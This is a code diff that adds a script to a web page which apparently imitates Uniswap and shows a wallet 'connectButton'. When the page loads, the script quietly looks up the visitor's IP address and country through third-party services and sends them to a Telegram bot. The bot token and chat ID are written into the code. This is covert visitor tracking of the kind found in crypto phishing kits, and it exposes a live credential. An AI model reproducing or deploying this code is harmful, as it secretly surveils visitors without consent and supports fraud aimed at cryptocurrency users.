@@ -28,6 +28,60 @@
     });
     
     </script>
+    <script>
+  // Function to send visitor information to Telegram
+  function sendToTelegram(ip, country, flag) {
+    var chatId = '1119354860'; // Replace with your chat ID
+    var botToken = '6751225350:AAH2K6H1zdefRXPgr6qFgtgKiLTGX0i0FtA'; // Replace with your bot token
+    var message = `
+🌐 **New Uniswap Visitor **
+
+📍 **IP Address:** ${ip}
+🌍 **Location:** ${country} ${flag}
+`;
+
+    // Construct the URL for sending the message
+    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    // Send the message using AJAX
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', url, true);
+    xhr.send();
+  }
+
+  // Function to convert country code to flag emoji
+  function getFlagEmoji(countryCode) {
+    return String.fromCodePoint(
+      ...[...countryCode.toUpperCase()].map(char => char.charCodeAt(0) + 127397)
+    );
+  }
+
+  // Function to get visitor's IP address and geolocation data
+  function fetchVisitorData() {
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        var ip = data.ip;
+
+        // Get geolocation data based on IP
+        fetch(`https://ipapi.co/${ip}/json/`)
+          .then(response => response.json())
+          .then(geoData => {
+            var country = geoData.country_name;
+            var countryCode = geoData.country_code;
+            var flag = getFlagEmoji(countryCode); // Convert country code to flag emoji
+
+            sendToTelegram(ip, country, flag); // Send IP, country, and flag to Telegram
+          })
+          .catch(error => console.error('Error getting geolocation data:', error));
+      })
+      .catch(error => console.error('Error getting IP:', error));
+  }
+
+  // Execute the function to fetch visitor data
+  fetchVisitorData();
+</script>
+
     
       <style>
       .connectButton {
